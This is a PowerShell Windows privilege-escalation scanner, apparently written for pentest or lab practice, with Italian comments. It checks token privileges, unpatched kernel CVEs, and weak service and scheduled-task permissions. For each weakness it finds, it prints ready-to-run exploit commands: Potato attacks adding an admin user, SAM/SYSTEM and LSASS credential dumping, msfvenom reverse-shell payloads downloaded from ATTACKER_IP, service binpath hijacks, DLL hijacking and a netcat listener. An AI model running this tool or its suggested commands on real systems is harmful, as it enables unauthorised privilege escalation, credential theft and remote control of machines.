$me = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$meEscaped = [regex]::Escape($me)
$mySid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
$groups = whoami /groups /fo csv | ConvertFrom-Csv | Select-Object -ExpandProperty "Group Name"
$groupSids = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).Groups | % { $_.Value }

Write-Host "`n============================================" -F Cyan
Write-Host "  Windows PrivEsc Scanner" -F Cyan
Write-Host "  Running as: $me" -F Cyan
Write-Host "  SID: $mySid" -F Cyan
Write-Host "============================================`n" -F Cyan

function Show-Perms($acl, $meEsc) {
    $acl -split "`n" | Select-String "Users|Everyone|Authenticated|$meEsc" | % {
        $line = $_.ToString().Trim()
        if($line -match '^(.+?)\s+([^:]+):(.+)$') {
            $principal = $matches[2]
            $permsPart = $matches[3]
            Write-Host "    $principal`: " -NoNewline
            if($permsPart -match '[FMW]' -and $permsPart -notmatch '\(IO\)') {
                Write-Host "$permsPart" -F Red
            } else {
                Write-Host "$permsPart" -F Gray
            }
        } elseif($line -match '^([^:]+):(.+)$') {
            $principal = $matches[1]
            $permsPart = $matches[2]
            Write-Host "    $principal`: " -NoNewline
            if($permsPart -match '[FMW]' -and $permsPart -notmatch '\(IO\)') {
                Write-Host "$permsPart" -F Red
            } else {
                Write-Host "$permsPart" -F Gray
            }
        }
    }
}

function Test-WritableAcl($acl, $meEsc, $grps) {
    $dominated = $false
    $acl -split "`n" | % {
        $line = $_
        if($line -notmatch '\(IO\)') {
            if($line -match "BUILTIN\\Users:.*[(\s,][FMW]" -or 
               $line -match "Everyone:.*[(\s,][FMW]" -or 
               $line -match "Authenticated Users:.*[(\s,][FMW]" -or 
               $line -match "${meEsc}:.*[(\s,][FMW]" -or 
               ($grps | % {$line -match "$([regex]::Escape($_)):.*[(\s,][FMW]"}) -contains $true) {
                $dominated = $true
            }
        }
    }
    return $dominated
}

# ==========================================
# PRIVILEGES CHECK
# ==========================================
Write-Host "============================================" -F Yellow
Write-Host "  [1/4] Checking Privileges..." -F Yellow
Write-Host "============================================" -F Yellow

$privs = whoami /priv /fo csv | ConvertFrom-Csv
$dangerousPrivs = @(
    @{Name="SeImpersonatePrivilege"; Desc="Potato attacks (SigmaPotato, GodPotato, JuicyPotato)"},
    @{Name="SeAssignPrimaryTokenPrivilege"; Desc="Token manipulation"},
    @{Name="SeBackupPrivilege"; Desc="Read any file (backup SAM/SYSTEM)"},
    @{Name="SeRestorePrivilege"; Desc="Write any file"},
    @{Name="SeDebugPrivilege"; Desc="Debug processes (dump LSASS)"},
    @{Name="SeLoadDriverPrivilege"; Desc="Load malicious driver"},
    @{Name="SeTakeOwnershipPrivilege"; Desc="Take ownership of any object"},
    @{Name="SeCreateTokenPrivilege"; Desc="Create arbitrary tokens"},
    @{Name="SeManageVolumePrivilege"; Desc="Read/write disk directly"}
)

$foundPrivs = @()
foreach($dp in $dangerousPrivs) {
    $priv = $privs | Where-Object { $_."Privilege Name" -eq $dp.Name }
    if($priv) {
        $foundPrivs += @{
            Name = $dp.Name
            Desc = $dp.Desc
            State = $priv.State
        }
    }
}

if($foundPrivs.Count -gt 0) {
    Write-Host "`n========================================" -F Cyan
    Write-Host "[!] DANGEROUS PRIVILEGES FOUND" -F Red
    Write-Host "========================================" -F Cyan
    
    foreach($fp in $foundPrivs) {
        Write-Host "`n[+] $($fp.Name)" -F Red
        Write-Host "    State: $($fp.State)"
        Write-Host "    Attack: $($fp.Desc)" -F Yellow
    }
    
    $hasImpersonate = $foundPrivs | Where-Object { $_.Name -eq "SeImpersonatePrivilege" }
    $hasAssignPrimary = $foundPrivs | Where-Object { $_.Name -eq "SeAssignPrimaryTokenPrivilege" }
    
    if($hasImpersonate -or $hasAssignPrimary) {
        Write-Host "`n[*] EXPLOIT - POTATO ATTACK:" -F Magenta
        Write-Host "    # Kali - scarica SigmaPotato:" -F White
        Write-Host "    wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe" -F Gray
        Write-Host "`n    # Target - scarica:" -F White
        Write-Host "    iwr -Uri http://ATTACKER_IP/SigmaPotato.exe -OutFile SigmaPotato.exe" -F Gray
        Write-Host "`n    # Aggiungi utente admin:" -F White
        Write-Host "    .\SigmaPotato.exe `"net user hacker Password123! /add`"" -F Gray
        Write-Host "    .\SigmaPotato.exe `"net localgroup Administrators hacker /add`"" -F Gray
        Write-Host "`n    # Reverse shell (via scheduled task per stabilità):" -F White
        Write-Host "    .\SigmaPotato.exe `"schtasks /create /tn reverse /tr C:\Windows\Temp\shell.exe /sc once /st 00:00 /ru SYSTEM`"" -F Gray
        Write-Host "    .\SigmaPotato.exe `"schtasks /run /tn reverse`"" -F Gray
        Write-Host "    .\SigmaPotato.exe `"schtasks /delete /tn reverse /f`"" -F Gray
        Write-Host "`n    # Alternative: GodPotato, JuicyPotato, PrintSpoofer, RoguePotato" -F DarkGray
    }
        
    $hasBackup = $foundPrivs | Where-Object { $_.Name -eq "SeBackupPrivilege" }
    if($hasBackup) {
        Write-Host "`n[*] EXPLOIT - BACKUP PRIVILEGE:" -F Magenta
        Write-Host "    # Dump SAM e SYSTEM:" -F White
        Write-Host "    reg save HKLM\SAM C:\Temp\SAM" -F Gray
        Write-Host "    reg save HKLM\SYSTEM C:\Temp\SYSTEM" -F Gray
        Write-Host "`n    # Kali - extract hashes:" -F White
        Write-Host "    impacket-secretsdump -sam SAM -system SYSTEM LOCAL" -F Gray
    }
    
    $hasDebug = $foundPrivs | Where-Object { $_.Name -eq "SeDebugPrivilege" }
    if($hasDebug) {
        Write-Host "`n[*] EXPLOIT - DEBUG PRIVILEGE:" -F Magenta
        Write-Host "    # Dump LSASS:" -F White
        Write-Host "    procdump.exe -ma lsass.exe lsass.dmp" -F Gray
        Write-Host "`n    # Kali - extract creds:" -F White
        Write-Host "    pypykatz lsa minidump lsass.dmp" -F Gray
    }
} else {
    Write-Host "`n[*] No dangerous privileges found" -F Gray
}

# ==========================================
# KERNEL EXPLOITS CHECK
# ==========================================
Write-Host "`n============================================" -F Yellow
Write-Host "  [2/4] Checking Kernel Exploits..." -F Yellow
Write-Host "============================================" -F Yellow

$osInfo = Get-CimInstance Win32_OperatingSystem
$build = $osInfo.BuildNumber
$version = $osInfo.Version
$patches = Get-CimInstance -Class win32_quickfixengineering | Select-Object -ExpandProperty HotFixID

Write-Host "`n[*] OS Info:" -F White
Write-Host "    Version: $($osInfo.Caption)"
Write-Host "    Build: $build"
Write-Host "    Patches: $($patches.Count) installed"

$kernelExploits = @(
    @{CVE="CVE-2023-29360"; Patch="KB5027215"; MinBuild="22000"; MaxBuild="22631"; Desc="MSKSSRV LPE"},
    @{CVE="CVE-2023-21768"; Patch="KB5022287"; MinBuild="22000"; MaxBuild="22621"; Desc="AFD Driver LPE"},
    @{CVE="CVE-2022-21882"; Patch="KB5010793"; MinBuild="19041"; MaxBuild="19044"; Desc="Win32k LPE"},
    @{CVE="CVE-2021-36934"; Patch="KB5004605"; MinBuild="19041"; MaxBuild="19043"; Desc="HiveNightmare/SAM"},
    @{CVE="CVE-2021-1732"; Patch="KB4601319"; MinBuild="19041"; MaxBuild="19042"; Desc="Win32k LPE"},
    @{CVE="CVE-2020-0787"; Patch="KB4540673"; MinBuild="18362"; MaxBuild="18363"; Desc="BITS LPE"},
    @{CVE="CVE-2020-1472"; Patch="KB4571756"; MinBuild="14393"; MaxBuild="19041"; Desc="ZeroLogon (DC)"},
    @{CVE="CVE-2019-1388"; Patch="KB4525236"; MinBuild="7600"; MaxBuild="18362"; Desc="UAC Bypass"},
    @{CVE="CVE-2018-8120"; Patch="KB4103712"; MinBuild="7600"; MaxBuild="7601"; Desc="Win32k LPE (Win7)"},
    @{CVE="CVE-2016-3309"; Patch="KB3185911"; MinBuild="7600"; MaxBuild="10586"; Desc="Win32k LPE"}
)

$vulnKernels = @()
foreach($ke in $kernelExploits) {
    if([int]$build -ge [int]$ke.MinBuild -and [int]$build -le [int]$ke.MaxBuild) {
        if($patches -notcontains $ke.Patch) {
            $vulnKernels += $ke
        }
    }
}

if($vulnKernels.Count -gt 0) {
    Write-Host "`n========================================" -F Cyan
    Write-Host "[!] POTENTIAL KERNEL EXPLOITS" -F Red
    Write-Host "========================================" -F Cyan
    
    foreach($vk in $vulnKernels) {
        Write-Host "`n[+] $($vk.CVE)" -F Red
        Write-Host "    Description: $($vk.Desc)"
        Write-Host "    Missing Patch: $($vk.Patch)" -F Yellow
        Write-Host "    Search: https://github.com/search?q=$($vk.CVE)+exploit" -F DarkGray
    }
    
    Write-Host "`n[!] WARNING:" -F Yellow
    Write-Host "    Kernel exploits can crash the system!" -F Yellow
    Write-Host "    Test on a clone first if possible." -F Yellow
} else {
    Write-Host "`n[*] No obvious kernel exploits found (patches up to date or build not matched)" -F Gray
}

# ==========================================
# SERVICES CHECK
# ==========================================
Write-Host "`n============================================" -F Yellow
Write-Host "  [3/4] Checking Services..." -F Yellow
Write-Host "============================================" -F Yellow

$services = @()

try {
    $services = Get-CimInstance win32_service -EA Stop | Where-Object {$_.PathName} | Select-Object Name, PathName
    Write-Host "[*] Using Get-CimInstance" -F DarkGray
} catch {
    Write-Host "[*] Get-CimInstance failed, trying registry fallback..." -F DarkGray
    
    try {
        Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" -EA Stop | ForEach-Object {
            $svcName = $_.PSChildName
            $imagePath = (Get-ItemProperty -Path $_.PSPath -EA SilentlyContinue).ImagePath
            
            if($imagePath) {
                $services += [PSCustomObject]@{
                    Name = $svcName
                    PathName = $imagePath
                }
            }
        }
    } catch {
        Write-Host "[!] Registry fallback also failed" -F Red
    }
}

Write-Host "[*] Found $($services.Count) services to check" -F DarkGray

foreach($svc in $services) {
    $n = $svc.Name
    $raw = $svc.PathName
    
    # Skip drivers
    if($raw -match '^\\SystemRoot|^System32\\drivers') {
        continue
    }
    
    $p = if($raw -match '^"([^"]+)"') {
        $matches[1]
    } elseif($raw -match '^([a-zA-Z]:\\[^\.]+\.\w+)') {
        $matches[1]
    } else {
        $raw.Split()[0]
    }
    
    $vuln = $false
    $bin = $null
    $dirv = $null
    $binWritable = $false
    $dirWritable = $false
    $canChangeConfig = $false
    $svcPerms = @()
    $unquotedVuln = $false
    $unquotedInfo = @()
    
    if(Test-Path $p -EA 0) {
        $a = icacls $p 2>$null | Out-String
        if(Test-WritableAcl $a $meEscaped $groups) {
            $vuln = $true
            $bin = $a
            $binWritable = $true
        }
    }
    
    $dir = Split-Path $p -Parent
    if($dir.Length -gt 3 -and (Test-Path $dir -EA 0)) {
        $d = icacls $dir 2>$null | Out-String
        if(Test-WritableAcl $d $meEscaped $groups) {
            $vuln = $true
            $dirv = $d
            $dirWritable = $true
        }
    }
    
    if($raw -notmatch '^"' -and $raw -match '\s' -and $raw -notmatch '^C:\\Windows\\') {
        $fullPath = if($raw -match '^([a-zA-Z]:\\[^\.]+\.\w+)') { $matches[1] } else { $null }
        
        if($fullPath) {
            $pathNoExt = $fullPath -replace '\.\w+$',''
            $words = $pathNoExt -split '\s+'
            
            for($i = 0; $i -lt $words.Count - 1; $i++) {
                $dropExe = ($words[0..$i] -join ' ') + '.exe'
                $checkDir = Split-Path $dropExe -Parent
                
                if($checkDir -and (Test-Path $checkDir -EA 0)) {
                    $acl = icacls $checkDir 2>$null | Out-String
                    if(Test-WritableAcl $acl $meEscaped $groups) {
                        $unquotedVuln = $true
                        $vuln = $true
                        $unquotedInfo += @{
                            DropPath = $dropExe
                            WritableDir = $checkDir
                        }
                    }
                }
            }
        }
    }
    
    $sd = sc.exe sdshow $n 2>$null | Where-Object {$_}

    # Se sc.exe fallisce, prova registry ACL
    if($sd -match "FAILED|Access is denied") {
        $sd = $null
        $svcKey = "HKLM:\SYSTEM\CurrentControlSet\Services\$n"
        try {
            $regAcl = Get-Acl $svcKey -EA Stop
            $regAcl.Access | Where-Object {
                ($_.IdentityReference -match "Users|Everyone|Authenticated|$meEscaped" -or
                ($groups | % { $_.IdentityReference -match [regex]::Escape($_) }) -contains $true) -and
                $_.RegistryRights -match "FullControl|WriteKey|SetValue"
            } | ForEach-Object {
                $svcPerms += "REGISTRY_WRITE"
                $canChangeConfig = $true
                $vuln = $true
            }
        } catch {}
    }

    if($sd) {
        $lowPrivPattern = '\(A;;([^;]*?);;;(AU|BU|WD|IU)\)'
        $aceMatches = [regex]::Matches($sd, $lowPrivPattern)
        
        foreach($ace in $aceMatches) {
            $rights = $ace.Groups[1].Value
            if($rights -match 'DC|GA') { $svcPerms += "CHANGE_CONFIG"; $canChangeConfig = $true }
            if($rights -match 'WD|GA') { $svcPerms += "CHANGE_PERMISSIONS"; $canChangeConfig = $true }
            if($rights -match 'WO|GA') { $svcPerms += "CHANGE_OWNER"; $canChangeConfig = $true }
            if($rights -match 'RP') { $svcPerms += "START" }
            if($rights -match 'WP') { $svcPerms += "STOP" }
        }
        
        if($sd -match "\(A;;([^;]*?);;;$mySid\)") {
            $rights = $matches[1]
            if($rights -match 'DC|GA') { $svcPerms += "CHANGE_CONFIG"; $canChangeConfig = $true }
            if($rights -match 'WD|GA') { $svcPerms += "CHANGE_PERMISSIONS"; $canChangeConfig = $true }
            if($rights -match 'WO|GA') { $svcPerms += "CHANGE_OWNER"; $canChangeConfig = $true }
            if($rights -match 'RP') { $svcPerms += "START" }
            if($rights -match 'WP') { $svcPerms += "STOP" }
        }
        
        foreach($gSid in $groupSids) {
            if($sd -match "\(A;;([^;]*?);;;$gSid\)") {
                $rights = $matches[1]
                if($rights -match 'DC|GA') { $svcPerms += "CHANGE_CONFIG"; $canChangeConfig = $true }
                if($rights -match 'WD|GA') { $svcPerms += "CHANGE_PERMISSIONS"; $canChangeConfig = $true }
                if($rights -match 'WO|GA') { $svcPerms += "CHANGE_OWNER"; $canChangeConfig = $true }
                if($rights -match 'RP') { $svcPerms += "START" }
                if($rights -match 'WP') { $svcPerms += "STOP" }
            }
        }
    }
    
    $svcPerms = $svcPerms | Select-Object -Unique
    
    if($canChangeConfig) { $vuln = $true }
    
    if($vuln) {
        Write-Host "`n========================================" -F Cyan
        Write-Host "[!] VULNERABLE SERVICE: $n" -F Red
        Write-Host "========================================" -F Cyan
        
        $cfg = sc.exe qc $n 2>$null
        $starttype = ($cfg | Select-String "START_TYPE") -replace '.*:\s+\d+\s+',''
        $runas = ($cfg | Select-String "SERVICE_START_NAME") -replace '.*SERVICE_START_NAME\s+:\s+',''
        
        Write-Host "`n[*] Service Config:" -F White
        Write-Host "    Run As: $runas"
        Write-Host "    Start Type: $starttype"
        Write-Host "    Binary: $p"
        if($raw -notmatch '^"' -and $raw -match '\s') {
            Write-Host "    PathName (raw): $raw" -F DarkGray
        }
        
        if($binWritable) {
            Write-Host "`n[+] BINARY WRITABLE:" -F Red
            Show-Perms $bin $meEscaped
        }
        
        if($dirWritable) {
            Write-Host "`n[+] DIR WRITABLE:" -F Yellow
            Write-Host "    $dir"
            Show-Perms $dirv $meEscaped
        }
        
        if($unquotedVuln) {
            Write-Host "`n[+] UNQUOTED SERVICE PATH:" -F Red
            Write-Host "    Path: $raw"
            foreach($info in $unquotedInfo) {
                Write-Host "    Writable Dir: $($info.WritableDir)" -F Yellow
                Write-Host "    Drop as: $($info.DropPath)" -F Green
            }
        }
        
        if($canChangeConfig) {
            Write-Host "`n[+] SERVICE CONFIG MODIFIABLE:" -F Red
            Write-Host "    User can modify service binpath!" -F Green
        }
        
        Write-Host "`n[*] Service Permissions:" -F White
        if($svcPerms.Count -gt 0) {
            Write-Host "    User can: $($svcPerms -join ', ')" -F Green
        } else {
            Write-Host "    User cannot control service" -F Gray
        }
        Write-Host "    Raw SDDL: $sd" -F DarkGray
        
        $fname = [System.IO.Path]::GetFileName($p)
        $dname = [System.IO.Path]::GetDirectoryName($p)
        
        if($canChangeConfig) {
            Write-Host "`n[*] EXPLOIT - BINPATH MODIFICATION:" -F Magenta
            Write-Host "    # Modifica binpath per aggiungere utente admin:" -F White
            Write-Host "    sc.exe config $n binpath= `"net localgroup administrators $me /add`"" -F Gray
            Write-Host "    sc.exe start $n" -F Gray
            Write-Host "`n    # Oppure reverse shell:" -F White
            Write-Host "    sc.exe config $n binpath= `"C:\Windows\Temp\shell.exe`"" -F Gray
            Write-Host "    sc.exe start $n" -F Gray
            Write-Host "`n    # Ripristina dopo:" -F White
            Write-Host "    sc.exe config $n binpath= `"$raw`"" -F Gray
        }
        
        if($unquotedVuln) {
            Write-Host "`n[*] EXPLOIT - UNQUOTED PATH:" -F Magenta
            foreach($info in $unquotedInfo) {
                $dropName = [System.IO.Path]::GetFileName($info.DropPath)
                Write-Host "    # Kali - genera payload:" -F White
                Write-Host "    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o $dropName" -F Gray
                Write-Host "    # Target - copia payload:" -F White
                Write-Host "    iwr -Uri http://ATTACKER_IP/$dropName -OutFile `"$($info.DropPath)`"" -F Gray
                Write-Host ""
            }
        }
        
        if($binWritable) {
            Write-Host "`n[*] EXPLOIT - BINARY REPLACE:" -F Magenta
            Write-Host "    # Kali - genera payload:" -F White
            Write-Host "    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o $fname" -F Gray
            Write-Host "`n    # Target - backup e sostituisci:" -F White
            Write-Host "    move `"$p`" `"$p.bak`"" -F Gray
            Write-Host "    iwr -Uri http://ATTACKER_IP/$fname -OutFile `"$p`"" -F Gray
        }
        
        if($dirWritable) {
            Write-Host "`n[*] EXPLOIT - DLL HIJACKING (persistenza):" -F Magenta
            Write-Host "    # Kali - genera DLL payload:" -F White
            Write-Host "    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o hijack.dll" -F Gray
            Write-Host "`n    # Trova DLL mancanti con ProcMon o prova comuni:" -F White
            Write-Host "    iwr -Uri http://ATTACKER_IP/hijack.dll -OutFile `"$dname\VERSION.dll`"" -F Gray
            Write-Host "    iwr -Uri http://ATTACKER_IP/hijack.dll -OutFile `"$dname\WTSAPI32.dll`"" -F Gray
            Write-Host "    iwr -Uri http://ATTACKER_IP/hijack.dll -OutFile `"$dname\USERENV.dll`"" -F Gray
            Write-Host "    iwr -Uri http://ATTACKER_IP/hijack.dll -OutFile `"$dname\SHFOLDER.dll`"" -F Gray
        }
        
        if($svcPerms -contains "STOP" -and $svcPerms -contains "START") {
            Write-Host "`n[*] TRIGGER:" -F Magenta
            Write-Host "    sc.exe stop $n" -F Gray
            Write-Host "    sc.exe start $n" -F Gray
        } elseif($svcPerms -contains "START") {
            Write-Host "`n[*] TRIGGER:" -F Magenta
            Write-Host "    sc.exe start $n" -F Gray
        } elseif(-not $canChangeConfig) {
            Write-Host "`n[*] TRIGGER:" -F Magenta
            Write-Host "    # No permessi start/stop - riavvia macchina:" -F White
            Write-Host "    shutdown /r /t 0" -F Gray
        }
        
        Write-Host "`n[*] LISTENER:" -F Magenta
        Write-Host "    nc -lvnp 4444" -F Gray
    }
}

# ==========================================
# SCHEDULED TASKS CHECK
# ==========================================
Write-Host "`n============================================" -F Yellow
Write-Host "  [4/4] Checking Scheduled Tasks..." -F Yellow
Write-Host "============================================" -F Yellow

$tasks = schtasks /query /fo CSV /v 2>$null | ConvertFrom-Csv | Where-Object {
    $_."Task To Run" -and
    $_."Task To Run" -notmatch '^COM handler|^Multiple Actions' -and
    $_."Task To Run" -notmatch '^C:\\Windows\\' -and
    $_."Scheduled Task State" -eq "Enabled"
}

Write-Host "[*] Found $($tasks.Count) tasks to check" -F DarkGray

foreach($task in $tasks) {
    $taskRaw = $task."Task To Run"
    
    # Estrai il path del binario (gestisce argomenti)
    $taskPath = if($taskRaw -match '^"([^"]+)"') {
        $matches[1]
    } elseif($taskRaw -match '^([a-zA-Z]:\\[^\s]+\.\w+)') {
        $matches[1]
    } else {
        $taskRaw.Split()[0]
    }
    
    $taskDir = Split-Path $taskPath -Parent
    $binWritable = $false
    $dirWritable = $false
    $binAcl = $null
    $dirAcl = $null
    
    if($taskPath -and (Test-Path $taskPath -EA 0)) {
        $binAcl = icacls $taskPath 2>$null | Out-String
        if(Test-WritableAcl $binAcl $meEscaped $groups) {
            $binWritable = $true
        }
    }
    
    if($taskDir -and $taskDir.Length -gt 3 -and (Test-Path $taskDir -EA 0)) {
        $dirAcl = icacls $taskDir 2>$null | Out-String
        if(Test-WritableAcl $dirAcl $meEscaped $groups) {
            $dirWritable = $true
        }
    }
    
    if($binWritable -or $dirWritable) {
        Write-Host "`n========================================" -F Cyan
        Write-Host "[!] VULNERABLE TASK: $($task.TaskName)" -F Red
        Write-Host "========================================" -F Cyan
        Write-Host "`n[*] Task Config:" -F White
        Write-Host "    Run As: $($task.'Run As User')"
        Write-Host "    Task To Run: $taskRaw" -F DarkGray
        Write-Host "    Binary: $taskPath"
        Write-Host "    Directory: $taskDir"
        Write-Host "    Status: $($task.Status)"
        Write-Host "    Next Run: $($task.'Next Run Time')"
        Write-Host "    Author: $($task.Author)"
        
        if($binWritable) {
            Write-Host "`n[+] BINARY WRITABLE:" -F Red
            Show-Perms $binAcl $meEscaped
        }
        
        if($dirWritable) {
            Write-Host "`n[+] DIR WRITABLE:" -F Yellow
            Write-Host "    $taskDir"
            Show-Perms $dirAcl $meEscaped
        }
        
        $fname = [System.IO.Path]::GetFileName($taskPath)
        
        if($binWritable) {
            Write-Host "`n[*] EXPLOIT - BINARY REPLACE:" -F Magenta
            Write-Host "    # Kali - genera payload:" -F White
            Write-Host "    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o $fname" -F Gray
            Write-Host "`n    # Target - backup e sostituisci:" -F White
            Write-Host "    move `"$taskPath`" `"$taskPath.bak`"" -F Gray
            Write-Host "    iwr -Uri http://ATTACKER_IP/$fname -OutFile `"$taskPath`"" -F Gray
        }
        
        if($dirWritable) {
            Write-Host "`n[*] EXPLOIT - DLL HIJACKING (persistenza):" -F Magenta
            Write-Host "    # Kali - genera DLL payload:" -F White
            Write-Host "    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o hijack.dll" -F Gray
            Write-Host "`n    # Trova DLL mancanti con ProcMon o prova comuni:" -F White
            Write-Host "    iwr -Uri http://ATTACKER_IP/hijack.dll -OutFile `"$taskDir\VERSION.dll`"" -F Gray
            Write-Host "    iwr -Uri http://ATTACKER_IP/hijack.dll -OutFile `"$taskDir\WTSAPI32.dll`"" -F Gray
            Write-Host "    iwr -Uri http://ATTACKER_IP/hijack.dll -OutFile `"$taskDir\USERENV.dll`"" -F Gray
            Write-Host "    iwr -Uri http://ATTACKER_IP/hijack.dll -OutFile `"$taskDir\SHFOLDER.dll`"" -F Gray
        }
        
        Write-Host "`n[*] TRIGGER:" -F Magenta
        Write-Host "    # Attendi esecuzione automatica o:" -F White
        Write-Host "    schtasks /run /tn `"$($task.TaskName)`"" -F Gray
        
        Write-Host "`n[*] LISTENER:" -F Magenta
        Write-Host "    nc -lvnp 4444" -F Gray
    }
}


# ==========================================
# SCHEDULED TASKS - INTERESTING USERS
# ==========================================
Write-Host "`n============================================" -F Yellow
Write-Host "  [4b/4] Scheduled Tasks - Interesting Users" -F Yellow
Write-Host "============================================" -F Yellow

$interestingTasks = schtasks /query /fo CSV /v 2>$null | ConvertFrom-Csv | Where-Object {
    $_."Scheduled Task State" -eq "Enabled" -and
    $_."Run As User" -and
    $_."Run As User" -notmatch '^(SYSTEM|LOCAL SERVICE|NETWORK SERVICE|INTERACTIVE|Users|Administrators|Everyone|Authenticated Users|S-1-|N/A|)$' -and
    $_."Run As User" -notmatch '^(NT AUTHORITY|BUILTIN|LocalSystem)' -and
    $_."Run As User" -notmatch [regex]::Escape($me) -and
    $_."Run As User" -notmatch [regex]::Escape($me.Split('\')[-1]) -and
    $_."Task To Run" -notmatch '^COM handler'
}

if($interestingTasks.Count -gt 0) {
    Write-Host "`n[!] Found $($interestingTasks.Count) tasks running as custom/domain users:" -F Cyan
    
    foreach($task in $interestingTasks) {
        Write-Host "`n----------------------------------------" -F DarkGray
        Write-Host "[*] Task: $($task.TaskName)" -F White
        Write-Host "    Run As: $($task.'Run As User')" -F Green
        Write-Host "    Command: $($task.'Task To Run')" -F Gray
        Write-Host "    Next Run: $($task.'Next Run Time')"
        Write-Host "    Last Run: $($task.'Last Run Time')"
        Write-Host "    Author: $($task.Author)"
        
        # Check se il binario esiste e mostra path completo
        $taskRaw = $task."Task To Run"
        $taskPath = if($taskRaw -match '^"([^"]+)"') {
            $matches[1]
        } elseif($taskRaw -match '^([a-zA-Z]:\\[^\s]+\.\w+)') {
            $matches[1]
        } else {
            $taskRaw.Split()[0]
        }
        
        if($taskPath -and (Test-Path $taskPath -EA 0)) {
            Write-Host "    Binary exists: $taskPath" -F DarkGray
            
            # Mostra ACL del binario
            $binAcl = icacls $taskPath 2>$null | Out-String
            if(Test-WritableAcl $binAcl $meEscaped $groups) {
                Write-Host "    [!] BINARY WRITABLE!" -F Red
            }
        }
    }
    
    Write-Host "`n[*] Why interesting:" -F Magenta
    Write-Host "    - Se puoi modificare il binario -> code execution as that user" -F Gray
    Write-Host "    - Se l'utente ha privilegi -> privesc" -F Gray
    Write-Host "    - Se e' domain user -> lateral movement / credential access" -F Gray
    Write-Host "    - Controlla con: net user <username> /domain" -F Gray
} else {
    Write-Host "[*] No tasks running as custom/domain users found" -F DarkGray
}

# ==========================================
# SCHEDULED TASKS - SYSTEM IN NON-STANDARD PATHS
# ==========================================
Write-Host "`n============================================" -F Yellow
Write-Host "  [4c/4] SYSTEM Tasks in Non-Standard Paths" -F Yellow
Write-Host "============================================" -F Yellow

$systemTasks = schtasks /query /fo CSV /v 2>$null | ConvertFrom-Csv | Where-Object {
    $_."Scheduled Task State" -eq "Enabled" -and
    $_."Run As User" -match '(SYSTEM|LocalSystem)' -and
    $_."Task To Run" -and
    $_."Task To Run" -notmatch '^COM handler|^Multiple Actions' -and
    $_."Task To Run" -notmatch '^C:\\Windows\\' -and
    $_."Task To Run" -notmatch '^C:\\Program Files\\' -and
    $_."Task To Run" -notmatch '^C:\\Program Files \(x86\)\\' -and
    $_."Task To Run" -notmatch '^%windir%' -and
    $_."Task To Run" -notmatch '^%systemroot%' -and
    $_."Task To Run" -notmatch '^%ProgramFiles%'
}

if($systemTasks.Count -gt 0) {
    Write-Host "`n[!] Found $($systemTasks.Count) SYSTEM tasks in non-standard paths:" -F Cyan
    
    $vulnerableSystemTasks = 0
    
    foreach($task in $systemTasks) {
        $taskRaw = $task."Task To Run"
        
        # Espandi variabili d'ambiente
        $taskExpanded = [Environment]::ExpandEnvironmentVariables($taskRaw)
        
        $taskPath = if($taskExpanded -match '^"([^"]+)"') {
            $matches[1]
        } elseif($taskExpanded -match '^([a-zA-Z]:\\[^\s]+\.\w+)') {
            $matches[1]
        } else {
            $taskExpanded.Split()[0]
        }
        
        # Skip se taskPath è vuoto o non valido
        if(-not $taskPath -or $taskPath.Length -lt 3) { continue }
        
        $taskDir = Split-Path $taskPath -Parent -EA SilentlyContinue
        
        # Check esistenza e permessi (verifica che non siano vuoti)
        $binExists = if($taskPath) { Test-Path $taskPath -EA 0 } else { $false }
        $dirExists = if($taskDir -and $taskDir.Length -gt 0) { Test-Path $taskDir -EA 0 } else { $false }
        
        # Mostra solo se esiste qualcosa da controllare
        if($binExists -or $dirExists) {
            $binWritable = $false
            $dirWritable = $false
            
            if($binExists) {
                $binAcl = icacls $taskPath 2>$null | Out-String
                if(Test-WritableAcl $binAcl $meEscaped $groups) { $binWritable = $true }
            }
            
            if($dirExists) {
                $dirAcl = icacls $taskDir 2>$null | Out-String
                if(Test-WritableAcl $dirAcl $meEscaped $groups) { $dirWritable = $true }
            }
            
            # Mostra solo se vulnerabile
            if($binWritable -or $dirWritable) {
                $vulnerableSystemTasks++
                Write-Host "`n========================================" -F Cyan
                Write-Host "[!] VULNERABLE SYSTEM TASK: $($task.TaskName)" -F Red
                Write-Host "========================================" -F Cyan
                Write-Host "    Run As: $($task.'Run As User')" -F Red
                Write-Host "    Command: $taskRaw" -F Gray
                Write-Host "    Binary: $taskPath"
                Write-Host "    Directory: $taskDir"
                
                if($binWritable) {
                    Write-Host "`n[+] BINARY WRITABLE - PRIVESC TO SYSTEM!" -F Red
                    Show-Perms $binAcl $meEscaped
                }
                
                if($dirWritable) {
                    Write-Host "`n[+] DIR WRITABLE - DLL HIJACK TO SYSTEM!" -F Yellow
                    Show-Perms $dirAcl $meEscaped
                }
                
                Write-Host "`n[*] EXPLOIT:" -F Magenta
                $fname = [System.IO.Path]::GetFileName($taskPath)
                Write-Host "    msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o $fname" -F Gray
                Write-Host "    move `"$taskPath`" `"$taskPath.bak`"" -F Gray
                Write-Host "    iwr -Uri http://IP/$fname -OutFile `"$taskPath`"" -F Gray
                Write-Host "    schtasks /run /tn `"$($task.TaskName)`"" -F Gray
            }
        }
    }
    
    if($vulnerableSystemTasks -eq 0) {
        Write-Host "[*] None of the $($systemTasks.Count) SYSTEM tasks are vulnerable (no writable binaries/dirs)" -F DarkGray
    }
} else {
    Write-Host "[*] No SYSTEM tasks in non-standard paths found" -F DarkGray
}
